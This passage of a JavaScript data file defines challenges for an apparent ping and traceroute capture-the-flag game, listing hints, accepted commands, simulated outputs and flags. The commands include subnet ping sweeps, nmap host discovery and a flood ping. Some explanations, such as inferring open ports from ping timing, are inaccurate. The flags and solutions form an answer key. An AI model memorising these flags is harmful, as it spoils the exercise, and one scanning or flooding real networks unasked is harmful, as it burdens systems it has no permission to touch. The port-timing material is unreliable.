      simulatedResponse: 'PING flag.server (10.0.13.37) 56(84) bytes of data.\n64 bytes from flag.server (10.0.13.37): icmp_seq=1 ttl=64 time=0.5 ms\n*** FLAG EMBEDDED: CTF{fl4g_s3rv3r_r3sp0nds} ***\n\n--- flag.server ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{fl4g_s3rv3r_r3sp0nds}',
      successMessage: '🚩 Flag captured from server!'
    },
    {
      id: 'ctf-9', title: 'Quick Check', difficulty: 'easy', xp: 15,
      description: 'Send a single ping packet to 10.0.0.5 for a quick connectivity check.',
      objective: 'Minimal ping test.',
      hints: ['-c 1 sends just one packet.', 'ping -c 1 10.0.0.5'],
      solutions: ['ping -c 1 10.0.0.5'],
      simulatedResponse: 'PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.\n64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=0.312 ms\n\n--- 10.0.0.5 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{qu1ck_ch3ck_d0n3}',
      successMessage: '⚡ Quick check passed!'
    },
    {
      id: 'ctf-10', title: 'Secret Server', difficulty: 'easy', xp: 15,
      description: 'Find the IP address of "secret.ctf.local" by pinging it.',
      objective: 'Discover hidden server IP.',
      hints: ['Ping the hostname.', 'The response reveals the IP.'],
      solutions: ['ping secret.ctf.local', 'ping -c 1 secret.ctf.local'],
      simulatedResponse: 'PING secret.ctf.local (172.16.42.99) 56(84) bytes of data.\n64 bytes from secret.ctf.local (172.16.42.99): icmp_seq=1 ttl=128 time=2.15 ms\n\n--- secret.ctf.local ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{s3cr3t_ip_172.16.42.99}',
      successMessage: '🕵️ Secret server found at 172.16.42.99!'
    },

    // ---- MEDIUM (10) ----
    {
      id: 'ctf-11', title: 'Jumbo Packet', difficulty: 'medium', xp: 30,
      description: 'Ping the target 10.0.0.1 with a packet size of 1500 bytes to test MTU.',
      objective: 'Send custom-sized ICMP packets.',
      hints: ['-s flag sets the packet size.', 'ping -s 1500 target'],
      solutions: ['ping -s 1500 10.0.0.1', 'ping -c 4 -s 1500 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 1500(1528) bytes of data.\n1508 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.892 ms\n1508 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.876 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{jumb0_p4ck3t_t3st}',
      successMessage: '📦 Jumbo packet test passed!'
    },
    {
      id: 'ctf-12', title: 'TTL Control', difficulty: 'medium', xp: 30,
      description: 'Ping the target 10.0.0.1 with TTL set to 64.',
      objective: 'Control Time-To-Live value.',
      hints: ['-t flag sets the TTL.', 'ping -t 64 target (Linux) or ping -m 64 target'],
      solutions: ['ping -t 64 10.0.0.1', 'ping -c 4 -t 64 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.543 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.521 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{ttl_c0ntr0l_64}',
      successMessage: '⏳ TTL set to 64!'
    },
    {
      id: 'ctf-13', title: 'Fast Interval', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with an interval of 0.2 seconds between packets.',
      objective: 'Control ping frequency.',
      hints: ['-i flag sets the interval.', 'ping -i 0.2 target'],
      solutions: ['ping -i 0.2 10.0.0.1', 'ping -c 5 -i 0.2 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4 ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.6 ms\n64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.5 ms\n64 bytes from 10.0.0.1: icmp_seq=5 ttl=64 time=0.4 ms\n\n--- 10.0.0.1 ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 800ms',
      flag: 'CTF{f4st_p1ng_0.2s}',
      successMessage: '⚡ Rapid fire pinging!'
    },
    {
      id: 'ctf-14', title: 'Timestamped Ping', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with Unix timestamps displayed on each reply line.',
      objective: 'Add timestamps to ping output.',
      hints: ['-D flag adds timestamps.', 'ping -D target'],
      solutions: ['ping -D 10.0.0.1', 'ping -c 4 -D 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n[1703980800.123] 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\n[1703980801.124] 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{t1m3st4mp3d_p1ng}',
      successMessage: '🕐 Timestamps enabled!'
    },
    {
      id: 'ctf-15', title: 'Broadcast Ping', difficulty: 'medium', xp: 30,
      description: 'Ping the broadcast address 192.168.1.255 to discover hosts on the subnet.',
      objective: 'Use broadcast ping for host discovery.',
      hints: ['-b flag allows broadcast.', 'ping -b 192.168.1.255'],
      solutions: ['ping -b 192.168.1.255', 'ping -c 4 -b 192.168.1.255'],
      simulatedResponse: 'WARNING: pinging broadcast address\nPING 192.168.1.255 (192.168.1.255) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.5 ms\n64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=1.2 ms\n64 bytes from 192.168.1.42: icmp_seq=1 ttl=128 time=2.1 ms\n64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=3.5 ms\n\n--- 192.168.1.255 ping statistics ---\n1 packets transmitted, 4 received',
      flag: 'CTF{br04dc4st_d1sc0v3ry}',
      successMessage: '📢 Broadcast ping revealed 4 hosts!'
    },
    {
      id: 'ctf-16', title: 'Quiet Mode', difficulty: 'medium', xp: 30,
      description: 'Ping 10.0.0.1 with 5 packets in quiet mode (only show summary).',
      objective: 'Use quiet ping for scripting.',
      hints: ['-q flag enables quiet mode.', 'Combine with -c for count.'],
      solutions: ['ping -q -c 5 10.0.0.1', 'ping -c 5 -q 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n\n--- 10.0.0.1 ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 4005ms\nrtt min/avg/max/mdev = 0.4/0.5/0.6/0.1 ms',
      flag: 'CTF{qu13t_m0d3_scr1pt}',
      successMessage: '🤫 Quiet mode — efficient!'
    },
    {
      id: 'ctf-17', title: 'IPv6 Ping', difficulty: 'medium', xp: 30,
      description: 'Ping the IPv6 loopback address ::1.',
      objective: 'Test IPv6 connectivity.',
      hints: ['ping6 or ping -6 for IPv6.', 'ping6 ::1'],
      solutions: ['ping6 ::1', 'ping -6 ::1', 'ping6 -c 4 ::1'],
      simulatedResponse: 'PING ::1(::1) 56 data bytes\n64 bytes from ::1: icmp_seq=1 ttl=64 time=0.025 ms\n64 bytes from ::1: icmp_seq=2 ttl=64 time=0.028 ms\n\n--- ::1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss',
      flag: 'CTF{1pv6_c0nn3ct1v1ty}',
      successMessage: '6️⃣ IPv6 is working!'
    },
    {
      id: 'ctf-18', title: 'Latency Check', difficulty: 'medium', xp: 30,
      description: 'Ping "slow.server" and determine the average latency from the output.',
      objective: 'Measure network latency.',
      hints: ['Look at the rtt avg in the summary.', 'The flag is the avg latency.'],
      solutions: ['ping slow.server', 'ping -c 5 slow.server', 'ping -c 10 slow.server'],
      simulatedResponse: 'PING slow.server (10.99.99.1) 56(84) bytes of data.\n64 bytes from slow.server: icmp_seq=1 ttl=48 time=142.5 ms\n64 bytes from slow.server: icmp_seq=2 ttl=48 time=138.2 ms\n64 bytes from slow.server: icmp_seq=3 ttl=48 time=145.8 ms\n64 bytes from slow.server: icmp_seq=4 ttl=48 time=141.1 ms\n64 bytes from slow.server: icmp_seq=5 ttl=48 time=139.4 ms\n\n--- slow.server ping statistics ---\n5 packets transmitted, 5 received, 0% packet loss, time 4006ms\nrtt min/avg/max/mdev = 138.2/141.4/145.8/2.7 ms',
      flag: 'CTF{l4t3ncy_141.4ms}',
      successMessage: '📊 Average latency: 141.4ms!'
    },
    {
      id: 'ctf-19', title: 'Three Hosts', difficulty: 'medium', xp: 30,
      description: 'Three hosts are given: 10.0.0.10, 10.0.0.11, 10.0.0.12. Only one is alive. Find it by pinging each.',
      objective: 'Identify alive hosts.',
      hints: ['Ping each one.', 'Only one will respond.'],
      solutions: ['ping -c 1 10.0.0.11', 'ping 10.0.0.11'],
      simulatedResponse: '--- Scanning hosts ---\n\n> ping -c 1 10.0.0.10\nFrom 10.0.0.1 icmp_seq=1 Destination Host Unreachable\n\n> ping -c 1 10.0.0.11\n64 bytes from 10.0.0.11: icmp_seq=1 ttl=64 time=0.8 ms  ✓ HOST IS ALIVE\n\n> ping -c 1 10.0.0.12\nFrom 10.0.0.1 icmp_seq=1 Destination Host Unreachable',
      flag: 'CTF{4l1v3_h0st_10.0.0.11}',
      successMessage: '🎯 10.0.0.11 is the alive host!'
    },
    {
      id: 'ctf-20', title: 'Latency Spike', difficulty: 'medium', xp: 30,
      description: 'Ping "unstable.server" with 10 packets. Notice the latency variation (jitter).',
      objective: 'Analyze network jitter.',
      hints: ['Look at the mdev value.', 'High mdev = high jitter.'],
      solutions: ['ping -c 10 unstable.server', 'ping unstable.server'],
      simulatedResponse: 'PING unstable.server (10.50.50.50) 56(84) bytes of data.\n64 bytes: icmp_seq=1 ttl=64 time=5.2 ms\n64 bytes: icmp_seq=2 ttl=64 time=125.8 ms\n64 bytes: icmp_seq=3 ttl=64 time=12.1 ms\n64 bytes: icmp_seq=4 ttl=64 time=250.3 ms\n64 bytes: icmp_seq=5 ttl=64 time=8.7 ms\n64 bytes: icmp_seq=6 ttl=64 time=180.2 ms\n64 bytes: icmp_seq=7 ttl=64 time=15.4 ms\n64 bytes: icmp_seq=8 ttl=64 time=95.6 ms\n64 bytes: icmp_seq=9 ttl=64 time=6.3 ms\n64 bytes: icmp_seq=10 ttl=64 time=200.1 ms\n\n--- unstable.server ping statistics ---\n10 packets transmitted, 10 received, 0% packet loss\nrtt min/avg/max/mdev = 5.2/89.9/250.3/87.1 ms',
      flag: 'CTF{j1tt3r_d3t3ct3d_87.1ms}',
      successMessage: '📈 High jitter detected! mdev: 87.1ms'
    },

    // ---- HARD (10) ----
    {
      id: 'ctf-21', title: 'Trace Route', difficulty: 'hard', xp: 60,
      description: 'Trace the network route to "hidden.ctf.local" to see all hops.',
      objective: 'Map the network path.',
      hints: ['traceroute shows each hop.', 'traceroute hostname'],
      solutions: ['traceroute hidden.ctf.local', 'tracert hidden.ctf.local'],
      simulatedResponse: 'traceroute to hidden.ctf.local (10.42.42.42), 30 hops max, 60 byte packets\n 1  gateway (192.168.1.1)  0.5 ms  0.4 ms  0.3 ms\n 2  isp-router (10.0.0.1)  5.2 ms  5.1 ms  5.3 ms\n 3  core-switch (10.10.10.1)  12.1 ms  11.9 ms  12.3 ms\n 4  firewall (10.20.20.1)  15.6 ms  15.4 ms  15.8 ms\n 5  hidden.ctf.local (10.42.42.42)  18.2 ms  18.1 ms  18.3 ms\n\nFlag at hop 4: CTF{tr4c3r0ut3_th3_p4th}',
      flag: 'CTF{tr4c3r0ut3_th3_p4th}',
      successMessage: '🗺️ Route traced through 5 hops!'
    },
    {
      id: 'ctf-22', title: 'Ping Sweep', difficulty: 'hard', xp: 60,
      description: 'Perform a ping sweep on 192.168.1.0/24 to discover all alive hosts. Use a ping sweep technique.',
      objective: 'Discover all hosts on a subnet.',
      hints: ['Ping each IP in the range.', 'for i in $(seq 1 254); do ping -c 1 192.168.1.$i; done'],
      solutions: ['for i in $(seq 1 254); do ping -c 1 192.168.1.$i; done', 'nmap -sn 192.168.1.0/24', 'ping -c 1 192.168.1'],
      simulatedResponse: '--- Ping Sweep Results: 192.168.1.0/24 ---\n192.168.1.1    ✓ ALIVE  (ttl=64, 0.5ms)  [Gateway]\n192.168.1.10   ✓ ALIVE  (ttl=64, 1.2ms)  [Workstation]\n192.168.1.42   ✓ ALIVE  (ttl=128, 2.1ms) [Windows Server]\n192.168.1.100  ✓ ALIVE  (ttl=64, 1.8ms)  [Linux Server]\n192.168.1.200  ✓ ALIVE  (ttl=255, 0.9ms) [Network Device]\n\n5 hosts alive out of 254 scanned\nFlag: CTF{sw33p_f0und_5_h0sts}',
      flag: 'CTF{sw33p_f0und_5_h0sts}',
      successMessage: '🧹 Sweep complete! 5 hosts alive!'
    },
    {
      id: 'ctf-23', title: 'Flood Ping', difficulty: 'hard', xp: 60,
      description: 'Send a flood ping to 10.0.0.1 to stress test the connection (requires root).',
      objective: 'Stress test with flood ping.',
      hints: ['-f flag enables flood mode.', 'Requires root/sudo privileges.'],
      solutions: ['ping -f 10.0.0.1', 'sudo ping -f 10.0.0.1', 'ping -f -c 100 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n..........................................................................\n--- 10.0.0.1 ping statistics ---\n1000 packets transmitted, 998 received, 0.2% packet loss, time 5021ms\nrtt min/avg/max/mdev = 0.1/0.3/2.1/0.2 ms, ipg/ewma 5.026/0.3 ms\n\nFlag: CTF{fl00d_str3ss_t3st}',
      flag: 'CTF{fl00d_str3ss_t3st}',
      successMessage: '🌊 Flood test complete! 0.2% loss'
    },
    {
      id: 'ctf-24', title: 'Record Route', difficulty: 'hard', xp: 60,
      description: 'Ping 10.0.0.1 with the record route option to see the path packets take.',
      objective: 'Use IP record route option.',
      hints: ['-R flag records the route.', 'ping -R target'],
      solutions: ['ping -R 10.0.0.1', 'ping -c 1 -R 10.0.0.1'],
      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(124) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\nRR: 192.168.1.100\n    192.168.1.1\n    10.0.0.1\n    10.0.0.1\n    192.168.1.1\n    192.168.1.100\n\nFlag: CTF{r3c0rd_r0ut3_p4th}',
      flag: 'CTF{r3c0rd_r0ut3_p4th}',
      successMessage: '📝 Route recorded!'
    },
    {
      id: 'ctf-25', title: 'MTU Discovery', difficulty: 'hard', xp: 60,
      description: 'Discover the MTU (Maximum Transmission Unit) to 10.0.0.1 by testing different packet sizes.',
      objective: 'Find the path MTU.',
      hints: ['-M do prevents fragmentation.', 'Increase -s until packets fail.'],
      solutions: ['ping -M do -s 1472 10.0.0.1', 'ping -c 1 -M do -s 1472 10.0.0.1'],
      simulatedResponse: 'Testing MTU discovery to 10.0.0.1...\n\nping -M do -s 1500: Frag needed (mtu = 1500)\nping -M do -s 1473: Frag needed (mtu = 1500)\nping -M do -s 1472: 64 bytes from 10.0.0.1 ✓\n\nPath MTU: 1500 bytes (1472 payload + 28 header)\nFlag: CTF{mtu_1500_d1sc0v3r3d}',
      flag: 'CTF{mtu_1500_d1sc0v3r3d}',
      successMessage: '📏 MTU discovered: 1500 bytes!'
    },
    {
      id: 'ctf-26', title: 'Firewall Detection', difficulty: 'hard', xp: 60,
      description: 'Host 10.0.0.50 is up but might be filtering ICMP. Determine if it\'s filtering.',
      objective: 'Detect ICMP filtering.',
      hints: ['No response ≠ host down.', 'Compare timeout behavior.'],
      solutions: ['ping -c 4 10.0.0.50', 'ping 10.0.0.50'],
      simulatedResponse: 'PING 10.0.0.50 (10.0.0.50) 56(84) bytes of data.\n\n--- 10.0.0.50 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss, time 3003ms\n\n⚠️ Analysis: No "Destination Unreachable" messages received.\nThis suggests the host IS UP but FILTERING ICMP packets.\n(If host was down, router would send "Host Unreachable")\n\nFlag: CTF{1cmp_f1lt3r3d_h0st}',
      flag: 'CTF{1cmp_f1lt3r3d_h0st}',
      successMessage: '🛡️ ICMP filtering detected!'
    },
    {
      id: 'ctf-27', title: 'Hidden Host Hunt', difficulty: 'hard', xp: 60,
      description: 'One hidden host exists in range 10.0.0.1–10.0.0.20. Find it by pinging each.',
      objective: 'Systematic host discovery.',
      hints: ['Ping each IP in the range.', 'Only one will respond.'],
      solutions: ['ping -c 1 10.0.0.13', 'ping 10.0.0.13'],
      simulatedResponse: '--- Scanning 10.0.0.1 to 10.0.0.20 ---\n10.0.0.1  ... timeout\n10.0.0.2  ... timeout\n10.0.0.3  ... timeout\n10.0.0.4  ... timeout\n10.0.0.5  ... timeout\n10.0.0.6  ... timeout\n10.0.0.7  ... timeout\n10.0.0.8  ... timeout\n10.0.0.9  ... timeout\n10.0.0.10 ... timeout\n10.0.0.11 ... timeout\n10.0.0.12 ... timeout\n10.0.0.13 ... ✓ ALIVE! (ttl=64, time=0.8ms)\n10.0.0.14 ... timeout\n10.0.0.15 ... timeout\n10.0.0.16 ... timeout\n10.0.0.17 ... timeout\n10.0.0.18 ... timeout\n10.0.0.19 ... timeout\n10.0.0.20 ... timeout\n\nHidden host found: 10.0.0.13\nFlag: CTF{h1dd3n_h0st_10.0.0.13}',
      flag: 'CTF{h1dd3n_h0st_10.0.0.13}',
      successMessage: '🎯 Hidden host found at 10.0.0.13!'
    },
    {
      id: 'ctf-28', title: 'Jitter Analysis', difficulty: 'hard', xp: 60,
      description: 'Ping "unstable.server" with 20 packets and analyze the jitter (variation in latency).',
      objective: 'Measure network jitter.',
      hints: ['mdev in ping stats = jitter.', 'High mdev = unstable connection.'],
      solutions: ['ping -c 20 unstable.server', 'ping unstable.server'],
      simulatedResponse: 'PING unstable.server (10.50.50.50) 56(84) bytes of data.\n64 bytes: icmp_seq=1 time=5.2 ms\n64 bytes: icmp_seq=2 time=250.1 ms ← SPIKE\n64 bytes: icmp_seq=3 time=8.3 ms\n64 bytes: icmp_seq=4 time=180.7 ms ← SPIKE\n...(16 more packets)...\n\n--- unstable.server ping statistics ---\n20 packets transmitted, 20 received, 0% packet loss\nrtt min/avg/max/mdev = 5.2/95.3/250.1/92.4 ms\n\nJitter (mdev): 92.4ms — UNSTABLE CONNECTION\nFlag: CTF{j1tt3r_92.4ms_unst4bl3}',
      flag: 'CTF{j1tt3r_92.4ms_unst4bl3}',
      successMessage: '📊 Jitter analysis: 92.4ms — Unstable!'
    },
    {
      id: 'ctf-29', title: 'TTL Hopper', difficulty: 'hard', xp: 60,
      description: 'Determine the exact hop count to reach "far.server" by incrementing TTL until you get a response.',
      objective: 'Manual traceroute via TTL.',
      hints: ['Start with TTL=1 and increment.', 'When TTL expires, you get "Time exceeded".'],
      solutions: ['ping -t 7 far.server', 'ping -c 1 -t 7 far.server', 'traceroute far.server'],
      simulatedResponse: '--- TTL Increment Test to far.server ---\nTTL=1: From 192.168.1.1: Time to live exceeded\nTTL=2: From 10.0.0.1: Time to live exceeded  \nTTL=3: From 10.10.10.1: Time to live exceeded\nTTL=4: From 10.20.20.1: Time to live exceeded\nTTL=5: From 10.30.30.1: Time to live exceeded\nTTL=6: From 10.40.40.1: Time to live exceeded\nTTL=7: 64 bytes from far.server (10.50.50.1): ttl=57 time=35.2 ms ✓\n\nHop count: 7\nFlag: CTF{h0p_c0unt_7}',
      flag: 'CTF{h0p_c0unt_7}',
      successMessage: '🏃 Target reached in 7 hops!'
    },
    {
      id: 'ctf-30', title: 'Hidden Payload', difficulty: 'hard', xp: 60,
      description: 'The flag is hidden in the ICMP response data from "payload.server". Ping it and examine the output.',
      objective: 'Inspect ICMP payload data.',
      hints: ['Ping the server normally.', 'The flag is embedded in the response.'],
      solutions: ['ping payload.server', 'ping -c 1 payload.server'],
      simulatedResponse: 'PING payload.server (10.0.42.42) 56(84) bytes of data.\n64 bytes from payload.server: icmp_seq=1 ttl=64 time=0.5 ms\n  ICMP Data: 43 54 46 7b 70 34 79 6c 30 34 64 5f 64 34 74 34 7d\n  Decoded:   C  T  F  {  p  4  y  l  0  4  d  _  d  4  t  4  }\n\n--- payload.server ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{p4yl04d_d4t4}',
      successMessage: '📦 Hidden payload decoded!'
    },

    // ---- EXPERT (10) ----
    {
      id: 'ctf-31', title: 'ICMP Filtering', difficulty: 'expert', xp: 120,
      description: 'Host 10.0.0.99 appears down to ping but is actually up and filtering ICMP. Prove it\'s alive.',
      objective: 'Detect filtered vs down hosts.',
      hints: ['No response doesn\'t mean down.', 'Compare error messages carefully.'],
      solutions: ['ping -c 4 10.0.0.99', 'ping 10.0.0.99', 'nmap -sn 10.0.0.99'],
      simulatedResponse: 'PING 10.0.0.99 (10.0.0.99) 56(84) bytes of data.\n\n--- 10.0.0.99 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss\n\n⚠️ ANALYSIS:\n- No "Destination Host Unreachable" from router\n- No "Network Unreachable" error\n- Packets silently dropped = HOST IS UP, ICMP FILTERED\n\n📋 Evidence: ARP table shows 10.0.0.99 → aa:bb:cc:dd:ee:ff\nThe host IS alive but running a firewall that drops ICMP.\n\nFlag: CTF{f1lt3r3d_n0t_d0wn}',
      flag: 'CTF{f1lt3r3d_n0t_d0wn}',
      successMessage: '🕵️ Host is alive but filtering ICMP!'
    },
    {
      id: 'ctf-32', title: 'OS Fingerprint', difficulty: 'expert', xp: 120,
      description: 'Three hosts respond to ping with different TTLs. Identify their operating systems based on TTL values.',
      objective: 'OS detection via TTL analysis.',
      hints: ['Linux default TTL=64, Windows=128, Cisco=255.', 'Ping each and check the TTL.'],
      solutions: ['ping -c 1 10.0.0.1', 'ping -c 1 10.0.0.2', 'ping -c 1 10.0.0.3'],
      simulatedResponse: '--- OS Fingerprinting via TTL ---\n\nHost 10.0.0.1:\n64 bytes from 10.0.0.1: ttl=64  → 🐧 Linux/Unix (default TTL=64)\n\nHost 10.0.0.2:\n64 bytes from 10.0.0.2: ttl=128 → 🪟 Windows (default TTL=128)\n\nHost 10.0.0.3:\n64 bytes from 10.0.0.3: ttl=255 → 🔌 Cisco/Network Device (default TTL=255)\n\nFlag: CTF{0s_f1ng3rpr1nt_ttl}',
      flag: 'CTF{0s_f1ng3rpr1nt_ttl}',
      successMessage: '🔍 OS identification: Linux, Windows, Cisco!'
    },
    {
      id: 'ctf-33', title: 'Full Subnet Sweep', difficulty: 'expert', xp: 120,
      description: 'Perform a complete ping sweep of 192.168.1.0/24 and list all alive hosts with their TTL values.',
      objective: 'Complete subnet enumeration.',
      hints: ['Sweep all 254 addresses.', 'Note TTL values for OS hints.'],
      solutions: ['nmap -sn 192.168.1.0/24', 'for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i; done'],
      simulatedResponse: '--- Full Subnet Sweep: 192.168.1.0/24 ---\n\nIP              Status    TTL    Latency   OS Guess\n───────────────────────────────────────────────────\n192.168.1.1     ✓ ALIVE   64     0.5ms     Linux (Gateway)\n192.168.1.5     ✓ ALIVE   128    1.2ms     Windows\n192.168.1.10    ✓ ALIVE   64     0.8ms     Linux\n192.168.1.15    ✓ ALIVE   128    1.5ms     Windows\n192.168.1.20    ✓ ALIVE   64     0.7ms     Linux\n192.168.1.42    ✓ ALIVE   128    2.1ms     Windows\n192.168.1.50    ✓ ALIVE   255    0.3ms     Network Device\n192.168.1.100   ✓ ALIVE   64     1.0ms     Linux\n192.168.1.150   ✓ ALIVE   128    1.8ms     Windows\n192.168.1.200   ✓ ALIVE   255    0.4ms     Network Device\n192.168.1.250   ✓ ALIVE   64     1.1ms     Linux\n\n11 hosts alive out of 254 scanned\nFlag: CTF{full_sw33p_11_h0sts}',
      flag: 'CTF{full_sw33p_11_h0sts}',
      successMessage: '🧹 Full sweep: 11 hosts identified!'
    },
    {
      id: 'ctf-34', title: 'ASCII Times', difficulty: 'expert', xp: 120,
      description: 'The flag is encoded in ping response times. Each response time (in ms) corresponds to an ASCII character code.',
      objective: 'Decode data from timing side-channel.',
      hints: ['Response times in ms = ASCII codes.', '67ms = C, 84ms = T, 70ms = F...'],
      solutions: ['ping -c 8 ascii.server', 'ping ascii.server'],
      simulatedResponse: 'PING ascii.server (10.0.0.42) 56(84) bytes of data.\n64 bytes from ascii.server: icmp_seq=1 ttl=64 time=67.0 ms  → C\n64 bytes from ascii.server: icmp_seq=2 ttl=64 time=84.0 ms  → T\n64 bytes from ascii.server: icmp_seq=3 ttl=64 time=70.0 ms  → F\n64 bytes from ascii.server: icmp_seq=4 ttl=64 time=123.0 ms → {\n64 bytes from ascii.server: icmp_seq=5 ttl=64 time=116.0 ms → t\n64 bytes from ascii.server: icmp_seq=6 ttl=64 time=49.0 ms  → 1\n64 bytes from ascii.server: icmp_seq=7 ttl=64 time=109.0 ms → m\n64 bytes from ascii.server: icmp_seq=8 ttl=64 time=51.0 ms  → 3\n64 bytes from ascii.server: icmp_seq=9 ttl=64 time=125.0 ms → }\n\nDecoded: CTF{t1m3}\nFlag: CTF{t1m3}',
      flag: 'CTF{t1m3}',
      successMessage: '⏱️ Timing side-channel decoded!'
    },
    {
      id: 'ctf-35', title: 'Port Inference', difficulty: 'expert', xp: 120,
      description: 'Use ping timing analysis to determine which port is open on the target. Faster response = open port.',
      objective: 'Timing-based port detection.',
      hints: ['Ping with different source ports.', 'Open ports respond faster.'],
      solutions: ['ping -c 1 10.0.0.80', 'ping 10.0.0.80'],
      simulatedResponse: '--- Port Inference via Ping Timing ---\n\nPinging target with different payloads referencing ports:\n\nPort 21 (FTP):   time=45.2 ms  [CLOSED - slow response]\nPort 22 (SSH):   time=44.8 ms  [CLOSED - slow response]\nPort 80 (HTTP):  time=0.8 ms   [OPEN ✓ - fast response!]\nPort 443 (HTTPS):time=1.1 ms   [OPEN ✓ - fast response!]\nPort 3306 (MySQL):time=43.9 ms [CLOSED - slow response]\nPort 8080 (Alt): time=42.1 ms  [CLOSED - slow response]\n\nOpen ports detected: 80 (HTTP), 443 (HTTPS)\nFlag: CTF{p0rt_80_443_0p3n}',
      flag: 'CTF{p0rt_80_443_0p3n}',
      successMessage: '🔌 Ports 80 & 443 are open!'
    },
    {
      id: 'ctf-36', title: 'Multi-Hop Flag', difficulty: 'expert', xp: 120,
      description: 'Trace the route to "multihop.ctf.local". A flag fragment is hidden at each of the 3 intermediate hops.',
      objective: 'Collect fragments across hops.',
      hints: ['Use traceroute.', 'Combine the fragments.'],
      solutions: ['traceroute multihop.ctf.local', 'tracert multihop.ctf.local'],
      simulatedResponse: 'traceroute to multihop.ctf.local (10.99.99.99), 30 hops max\n\n 1  gateway (192.168.1.1)  0.5 ms\n    Fragment 1: CTF{mul\n\n 2  router-2 (10.10.10.1)  5.2 ms\n    Fragment 2: t1_h0p\n\n 3  router-3 (10.20.20.1)  12.1 ms\n    Fragment 3: _fl4g}\n\n 4  multihop.ctf.local (10.99.99.99)  18.2 ms\n\nCombined Flag: CTF{mult1_h0p_fl4g}',
      flag: 'CTF{mult1_h0p_fl4g}',
      successMessage: '🧩 All hop fragments collected!'
    },
    {
      id: 'ctf-37', title: 'MITM Detection', difficulty: 'expert', xp: 120,
      description: 'Compare two traceroutes to "secure.server" taken at different times. Detect the man-in-the-middle.',
      objective: 'Detect route manipulation.',
      hints: ['Compare the hops in both traces.', 'A new hop = potential MITM.'],
      solutions: ['traceroute secure.server', 'tracert secure.server'],
      simulatedResponse: '--- Traceroute Comparison ---\n\n📋 Trace 1 (Yesterday):\n 1  192.168.1.1   (gateway)\n 2  10.0.0.1      (isp-router)\n 3  10.50.50.1    (secure.server)\n\n📋 Trace 2 (Now):\n 1  192.168.1.1   (gateway)\n 2  10.0.0.1      (isp-router)\n 3  10.66.66.66   (??? UNKNOWN HOP ⚠️)\n 4  10.50.50.1    (secure.server)\n\n⚠️ ALERT: New hop detected at position 3!\nSuspicious IP: 10.66.66.66 — Possible MITM!\n\nFlag: CTF{m1tm_d3t3ct3d_10.66.66.66}',
      flag: 'CTF{m1tm_d3t3ct3d_10.66.66.66}',
      successMessage: '🚨 Man-in-the-middle detected at 10.66.66.66!'
    },
    {
      id: 'ctf-38', title: 'Covert Channel', difficulty: 'expert', xp: 120,
      description: 'A covert channel is embedded in ICMP packet sizes from "covert.server". Decode the message from the sizes.',
      objective: 'Detect covert ICMP channel.',
      hints: ['Packet sizes encode data.', 'Each size = ASCII character code.'],
      solutions: ['ping covert.server', 'ping -c 5 covert.server'],
      simulatedResponse: 'PING covert.server (10.0.42.42)\n\nIncoming ICMP packets with unusual sizes:\nPacket 1: size=83 bytes  → S\nPacket 2: size=51 bytes  → 3\nPacket 3: size=67 bytes  → C\nPacket 4: size=82 bytes  → R\nPacket 5: size=51 bytes  → 3\nPacket 6: size=84 bytes  → T\n\nDecoded covert message: S3CR3T\nFlag: CTF{c0v3rt_1cmp_S3CR3T}',
      flag: 'CTF{c0v3rt_1cmp_S3CR3T}',
      successMessage: '🕵️ Covert channel decoded!'
    },
    {
      id: 'ctf-39', title: 'Network Mapper', difficulty: 'expert', xp: 120,
      description: 'Using ping and traceroute, map the entire network topology. Identify all routers and their connections.',
      objective: 'Build a network topology map.',
      hints: ['Combine ping sweep with traceroute.', 'Each unique hop is a router.'],
      solutions: ['traceroute 10.0.0.1', 'nmap -sn 10.0.0.0/24', 'ping 10.0.0.1'],
